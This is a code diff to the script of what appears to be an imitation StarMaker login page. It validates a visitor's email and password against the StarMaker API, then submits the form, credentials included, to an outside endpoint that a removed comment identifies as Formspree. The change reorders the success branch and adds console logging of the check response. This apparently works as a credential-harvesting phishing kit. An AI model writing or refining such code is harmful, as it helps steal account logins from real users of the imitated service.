@@ -688,19 +688,23 @@
         // First, verify password with StarMaker API
         const passwordCheck = await checkPassword(email, password);
         
-        if (!passwordCheck.success) {
+        console.log('Password check response:', passwordCheck);
+        
+        // Check if authentication was successful
+        if (passwordCheck.success === true) {
+          // Password is correct - proceed to submit form
+          console.log('Login successful, proceeding to redirect');
+          const data = new FormData(form);
+          ajax(form.method, form.action, data, success, error);
+        } else {
           // Password is incorrect
           submitBtn.classList.remove('loading');
           passwordError.textContent = passwordCheck.message || 'Username or password is incorrect';
           passwordError.classList.add('show');
           return;
         }
-        
-        // Password is correct, now submit to Formspree
-        const data = new FormData(form);
-        ajax(form.method, form.action, data, success, error);
       });
-
+      
       // Add input animation on typing
       const inputs = form.querySelectorAll('input');
       inputs.forEach(input => {
@@ -731,5 +735,6 @@
   </script>
 </body>
 </html>
+
 
 
